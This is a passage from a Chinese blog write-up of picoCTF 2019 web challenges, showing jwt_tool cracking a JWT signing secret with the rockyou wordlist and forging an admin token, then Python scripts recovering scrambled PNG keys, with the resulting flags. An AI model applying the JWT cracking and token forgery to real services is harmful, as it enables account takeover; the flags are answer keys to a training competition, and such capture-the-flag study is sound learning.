Tamper with JWT data (multiple signing options)  #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#             ==== VULNERABILITIES ====                #</span></span><br><span class="line"><span class="comment">#  2: Check for the "none" algorithm vulnerability     #</span></span><br><span class="line"><span class="comment">#  3: Check for HS/RSA key confusion vulnerability     #</span></span><br><span class="line"><span class="comment">#  4: Check for JWKS key injection vulnerability       #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== CRACKING/GUESSING ====               #</span></span><br><span class="line"><span class="comment">#  5: Check HS signature against a key (password)      #</span></span><br><span class="line"><span class="comment">#  6: Check HS signature against key file              #</span></span><br><span class="line"><span class="comment">#  7: Crack signature with supplied dictionary file    #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== RSA KEY FUNCTIONS ====               #</span></span><br><span class="line"><span class="comment">#  8: Verify RSA signature against a Public Key        #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#  0: Quit                                             #</span></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"></span><br><span class="line">Please make a selection (1-6)</span><br><span class="line">&gt; 7</span><br><span class="line"></span><br><span class="line">Loading key dictionary...</span><br><span class="line">File loaded: /root/wordlists/rockyou.txt</span><br><span class="line">Testing passwords <span class="keyword">in</span> dictionary...</span><br><span class="line">[*] Tested 1 million passwords so far</span><br><span class="line">[*] Tested 2 million passwords so far</span><br><span class="line">[*] Tested 3 million passwords so far</span><br><span class="line">[*] Tested 4 million passwords so far</span><br><span class="line">[*] Tested 5 million passwords so far</span><br><span class="line">[*] Tested 6 million passwords so far</span><br><span class="line">[*] Tested 7 million passwords so far</span><br><span class="line"></span><br><span class="line">[+] ilovepico is the CORRECT key!</span><br></pre></td></tr></table></figure>
+<p>然后去jwt官网生成一个user位admin的假令牌<br><figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./12.png" title="图片" data-fancybox="images"><img src="./12.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s</span><br></pre></td></tr></table></figure>
+<p>将token替换cookie后刷新页面<br><figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./13.png" title="图片" data-fancybox="images"><img src="./13.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<p>picoCTF{jawt_was_just_what_you_thought_9ed4519dee8140de7a186a5df5a08d6e}</p>
+<h2 id="Java-Script-Kiddie-Points-400"><a href="#Java-Script-Kiddie-Points-400" class="headerlink" title="Java Script Kiddie - Points: 400"></a>Java Script Kiddie - Points: 400</h2><blockquote>
+<p>The image link appears broken… <a href="https://2019shell1.picoctf.com/problem/37330" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37330</a> or <a href="http://2019shell1.picoctf.com:37330" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37330</a><br>Hints: This is only a JavaScript problem.</p>
+</blockquote>
+<p>查看源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">	bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">var</span> key = <span class="string">"0000000000000000"</span>;</span><br><span class="line">	<span class="keyword">var</span> shifter;</span><br><span class="line">	<span class="keyword">if</span>(u_in.length == LEN)&#123;</span><br><span class="line">		key = u_in;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> result = [];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">		shifter = key.charCodeAt(i) - <span class="number">48</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>去到 bytes 页面,看到一大串十六进制码,用大佬的脚本将bytes还原成图片跑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">b = list(map(int, <span class="string">'254 80 209 18 188 10 188 243 2 53 69 13 255 180 221 188 56 0 2 132 0 0 243 69 252 53 190 137 64 58 147 202 185 0 183 59 13 73 155 10 253 206 63 173 96 191 230 0 158 16 59 127 0 2 73 114 156 135 33 73 73 139 237 82 243 61 0 123 165 30 26 65 191 1 255 89 0 223 223 108 241 218 78 194 148 168 1 164 78 68 228 221 155 27 0 219 137 156 1 181 32 138 68 55 0 0 87 205 161 130 68 35 0 231 0 239 170 183 188 48 1 0 174 247 252 72 95 89 164 167 69 0 248 191 37 31 84 120 0 66 45 192 110 204 48 73 82 71 136 239 50 29 128 28 0 13 231 65 208 222 5 235 32 114 56 173 229 159 144 150 156 0 215 111 72 205 113 237 25 2 249 225 102 227 179 160 192 237 243 46 64 75 144 116 157 223 177 55 50 199 95 194 6 71 60 62 119 65 121 6 13 110 161 145 214 235 228 254 77 104 223 157 52 254 107 103 146 14 147 193 85 227 36 73 193 243 119 225 119 75 4 175 65 155 210 113 127 182 252 202 98 121 191 107 3 4 210 41 235 255 235 91 214 199 222 86 35 102 55 84 231 223 98 32 192 245 234 66 251 37 113 254 252 216 141 196 24 226 186 214 150 110 166 1 158 221 252 186 143 212 161 193 192 114 202 76 51 164 196 45 126 226 246 54 159 243 225 81 206 117 197 208 207 212 247 210 239 217 32 152 252 248 251 253 118 252 82 223 31 117 134 139 117 56 190 250 5 188 115 65 130 10 143 158 91 134 186 126 193 198 159 126 14 178 87 130 52 16 117 131 252 51 137 244 244 84 186 186 239 34 30 237 239 253 71 88 61 219 76 13 22 203 68 28 231 226 111 212 124 105 69 242 21 207 189 141 145 233 191 46 28 239 197 219 96 196 100 222 195 7 54 235 246 65 222 32 1 199 249 73 55 245 206 31 191 55 45 99 136 112 208 16 223 66 120 182 2 213 12 87 131 150 243 144 211 215 233 73 150 238 211 134 96 55 32 244 128 152 229 31 96 44 169 108 207 249 115 136 224 65 235 39 213 219 99 255 242 168 239 179 100 6 206 239 251 181 99 136 72 122 31 222 65 228 16 105 164 11 115 246 34 195 159 124 49 44 190 44 134 252 248 220 86 199 91 57 98 190 185 227 171 120 214 106 11 24 187 189 124 249 197 4 98 33 250 109 59 127 114 125 152 200 121 0 163 170 143 127 80 242 222 51 157 143 223 215 196 70 99 161 55 252 98 145 120 227 53 9 17 0 253 197 181 254 124 254 218 253 186 17 171 99 226 146 94 70 13 188 175 233 233 165 86 111 108 210 235 56 115 157 241 127 209 251 48 169 15 81 190 10 157 243 193 214 243 126 225 189 105 31 27 75 29 234 223 118 31 213 73 246 80 245 210 11 159 127 104 237 90 63 170 74 115 149 220 167 231 31 180 162 127 239 88 97 113 126 180 111 108 239 109 167 106 15 143 117 107 113 39 79 171 139 82 157 166 191 191 254 79 129 255 241 211 27 175 125 98 85 93 253 90 154 107 227 250 206 245 64 205 243 244 87 180 172 231 190 235 78 75 25 206 196 59 247 162 0 252 254 90 158 215 159 154 102 236 234'</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line">shifters = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./14.png" title="图片" data-fancybox="images"><img src="./14.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{cad9a05f668a0c9d2543a9867a998cbd}</p>
+<h2 id="Java-Script-Kiddie-2-Points-450"><a href="#Java-Script-Kiddie-2-Points-450" class="headerlink" title="Java Script Kiddie 2 - Points: 450"></a>Java Script Kiddie 2 - Points: 450</h2><blockquote>
+<p>The image link appears broken… twice as badly… <a href="https://2019shell1.picoctf.com/problem/49893" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/49893</a> or <a href="http://2019shell1.picoctf.com:49893" target="_blank" rel="noopener">http://2019shell1.picoctf.com:49893</a><br>Hints: This is only a JavaScript problem.</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">	$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">	bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">	&#125;);</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">var</span> key = <span class="string">"00000000000000000000000000000000"</span>;</span><br><span class="line">	<span class="keyword">var</span> shifter;</span><br><span class="line">	<span class="keyword">if</span>(u_in.length == key.length)&#123;</span><br><span class="line">	key = u_in;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> result = [];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">	shifter = Number(key.slice((i*<span class="number">2</span>),(i*<span class="number">2</span>)+<span class="number">1</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">	result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">	result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>用第一题的脚本依旧可以跑出来flag<br><figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./15.png" title="图片" data-fancybox="images"><img src="./15.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<p>picoCTF{9e8a320ce2243468099aaf4047094320}</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-10-17T09:14:44.152Z" itemprop="dateUpdated">2020-10-17 17:14:44</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/ctf-writeup/ckwwysfv1000jvwuct2lq1y8r/2019picoCTF补充wp-10050分记录/" target="_blank" rel="external">https://www.damyahome.github.io/ctf-writeup/ckwwysfv1000jvwuct2lq1y8r/2019picoCTF补充wp-10050分记录/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.damyahome.github.io">
+            <img src="/img/avatar.jpg" alt="Damya">
+            Damya
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/个人ctf竞赛/">个人ctf竞赛</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckwwysfv1000jvwuct2lq1y8r/2019picoCTF补充wp-10050分记录/&title=《2019picoCTF补充wp(10050分记录)》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckwwysfv1000jvwuct2lq1y8r/2019picoCTF补充wp-10050分记录/&title=《2019picoCTF补充wp(10050分记录)》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/日常/ckwwysfvj000rvwuc9zbrc4by/2019年终总结/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">2019年终总结</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/ctf-writeup-web/ckwwysfy00022vwuco6sdxwr7/Damya大二上考核题目wp记录/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Damya大二上考核题目wp记录</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#一般技能-General-Skills"><span class="post-toc-number">1.</span> <span class="post-toc-text">一般技能(General Skills)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#whats-the-difference-Points-200"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">whats-the-difference - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flag-shop-Points-300"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">flag_shop - Points: 300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mus1c-Points-300"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">mus1c - Points: 300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1-wanna-b3-a-r0ck5tar-Points-350"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">1_wanna_b3_a_r0ck5tar - Points: 350</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#密码学-Cryptography"><span class="post-toc-number">2.</span> <span class="post-toc-text">密码学(Cryptography)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Mr-Worldwide-Points-200"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Mr-Worldwide - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#rsa-pop-quiz-Points-200"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">rsa-pop-quiz - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#miniRSA-Points-300"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">miniRSA - Points: 300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#b00tl3gRSA2-Points-400"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">b00tl3gRSA2 - Points: 400</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#杂项-Forensics"><span class="post-toc-number">3.</span> <span class="post-toc-text">杂项(Forensics)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WhitePages-Points-250"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">WhitePages - Points: 250</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#like1000-Points-250"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">like1000 - Points: 250</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shark-on-wire-2-Points-300"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">shark on wire 2 - Points: 300</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB应用-Web-Exploitation"><span class="post-toc-number">4.</span> <span class="post-toc-text">WEB应用(Web Exploitation)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Irish-Name-Repo-2-Points-350"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Irish-Name-Repo 2 - Points: 350</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Irish-Name-Repo-3-Points-400"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">Irish-Name-Repo 3 - Points: 400</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#JaWT-Scratchpad-Points-400"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">JaWT Scratchpad - Points: 400</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Java-Script-Kiddie-Points-400"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">Java Script Kiddie - Points: 400</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Java-Script-Kiddie-2-Points-450"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">Java Script Kiddie 2 - Points: 450</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        让这个世界的bug有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://w4nder.top/" target="_blank">W4nder</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.virzz.com/" target="_blank">Virink</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.vigorous.top/" target="_blank">Vigorous</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.mklkx.xyz/" target="_blank">mklkx</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.cnblogs.com/cx1ng/" target="_blank">cxing</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Damya &copy; 2018 - 2021
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckwwysfv1000jvwuct2lq1y8r/2019picoCTF补充wp-10050分记录/&title=《2019picoCTF补充wp(10050分记录)》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckwwysfv1000jvwuct2lq1y8r/2019picoCTF补充wp-10050分记录/&title=《2019picoCTF补充wp(10050分记录)》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
